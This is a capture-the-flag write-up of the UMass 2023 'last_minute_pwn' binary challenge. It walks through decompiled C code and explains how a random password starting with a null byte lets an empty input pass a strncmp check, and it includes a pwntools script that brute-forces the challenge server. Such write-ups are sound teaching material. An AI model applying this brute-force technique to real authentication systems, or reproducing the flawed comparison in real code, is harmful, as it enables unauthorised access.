# UMass 2023 - last\_minute\_pwn

## Description

> Idk, 1 pwn seemed kinda low so here's another
>
> [last\_minute\_pwn](https://umass-ctf-challenges.s3.amazonaws.com/pwn/last\_minute\_pwn)
>
> `nc last_minute_pwn.pwn.umasscybersec.org 7293`

## The challenge

We are given a 64-bit linux binary. The binary doesn't have any stack canaries according to checksec but this fact won't be needed, it will turn out there are no stack buffer overflows to abuse. I can proudly say I got both a first blood and an unintended in this challenge, that's always something! :D

```
➜  last file ./last_minute_pwn
./last_minute_pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=351ccad1d89b2c1e96ac2ce97fa96a9574b521de, for GNU/Linux 3.2.0, not stripped
➜  last checksec ./last_minute_pwn
[*] '/home/tabun-dareka/umass/last/last_minute_pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

Before opening up Ghidra we can poke at the program by running it.

```
➜  last ./last_minute_pwn

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 >> 3
Shutting Off...
➜  last ./last_minute_pwn

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 >> 2
Please authenticate to access the configs
Enter password
 >> testtest
Login failed

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 >> 1
```

So we get a menu with three options. One just exists, the second one asks us for a password (Maybe if we get the password right we get the flag? Or maybe the password is the flag?) and the first one launches a simple terminal math game. If we launch the game we are asked if we're ready. `n` just goes back to the previous menu and `y` goes to a next menu.

```
Are you ready for the ultimate math game? [y/n]
 >> n

.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
	~ 1 Launch Game ~
	~ 2 Edit config ~
	~ 3 Exit        ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 >> 1
Are you ready for the ultimate math game? [y/n]
 >> y
.~~~~~~~~~~~~.Menu.~~~~~~~~~~~~.
    ~ 1 Answer a question ~
    ~ 2 Print Answers     ~
    ~ 3 Start a new game  ~
    ~ 4 End Game          ~
.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
 >>
```

By poking a little more at the program we can see that the options do what they say, so let's already go to Ghidra. This is the main function:

```c
undefined8 main(void)
{
  password = get_admin_pass();
  run();
  return 1;
}
```

`password` is a global variable that stores a pointer that points to well... a password. This is how it's generated:

```c
char * get_admin_pass(void)
{
  char *__s;
  FILE *__stream;
  
  __s = (char *)malloc(0x14);
  __stream = fopen("/dev/urandom","rb");
  fgets(__s,0x10,__stream);
  __s[0x10] = '\0';
  fclose(__stream);
  return __s;
}
```

It's just random bytes. Including bytes like nullbytes. Keep it in mind cause it may be important. ;)

This is how the first main menu function looks like:

```c
void run(void)

{
  char *pcVar1;
  char local_14 [8];
  uint option;
  
  do {
    while( true ) {
      print_main_menu();
      pcVar1 = fgets(local_14,8,stdin);
      if (pcVar1 == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      option = atoi(local_14);
      if (option == 3) {
        puts("Shutting Off...");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      if (option < 4) break;
LAB_00101a50:
      puts("Unrecognized Option");
    }
    if (option == 1) {
      game();
    }
    else {
      if (option != 2) goto LAB_00101a50;
      config();
    }
  } while( true );
}
```

Nothing too see there, so let's go straight away to the config function and let's check how the password is checked.

```c
void config(void)
{
  bool bVar1;
  undefined7 extraout_var;
  
  puts("Please authenticate to access the configs");
  bVar1 = authenticate_admin();
  if ((int)CONCAT71(extraout_var,bVar1) == 0) {
    puts("Login failed");
  }
  else {
    puts("Login Successful, here are the creds");
    print_flag();
  }
  return;
}

bool authenticate_admin(void)
{
  int iVar1;
  char *pcVar2;
  size_t sVar3;
  undefined8 local_638;
  undefined8 local_630;
  char local_28 [32];
  
  local_630 = password[1];
  local_638 = *password;
  puts("Enter password");
  printf(" >> ");
  pcVar2 = fgets(local_28,0x20,stdin);
  if (pcVar2 == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar3 = strcspn(local_28,"\n");
  local_28[sVar3] = '\0';
  iVar1 = strncmp(local_28,(char *)&local_638,0xe);
  return iVar1 == 0;
}
```

Now we can see that if we get the password right we get a flag. Look closely at the `authenticate_admin` function and try to find the unintended solution. The trick is to know that strcmp type of functions stop comparing when they encouter a nullbyte because they are designed for c-style strings. If our input is just a newline then it gets overwritten as a nullbyte because of the lines:

```c
  sVar3 = strcspn(local_28,"\n");
  local_28[sVar3] = '\0';
```

Now we just need a nullbyte at the beginning of the random password. It's a simple bruteforce that shouldn't take too much time because we only pray for a single byte to equal zero. There's my solve.py script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./last_minute_pwn_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("last_minute_pwn.pwn.umasscybersec.org", 7293)

    return r


def main():
    while True:
        r = conn()
        r.sendline(b'2')
        r.sendline(b'')
        r.recvuntil(b'Login ')
        a = r.recv(1)
        if a == b'f':
            r.close()
            continue
        else:
            r.interactive()


if __name__ == "__main__":
    main()
```

...aaaand we get the flag: `UMASSCTF{todo:_think_of_a_creative_flag}` .

Now about the intended solution. I haven't tested it myself but I spoke with the admin/author about it. By answering neither `y` nor `n` to the question if you're ready, you can get a stack leak. According to him the intended solution was to recursively call the game through the restart option to shift the stack frame over the area where the flag was written to the stack in the password init function and then leak it using option two from the second menu.
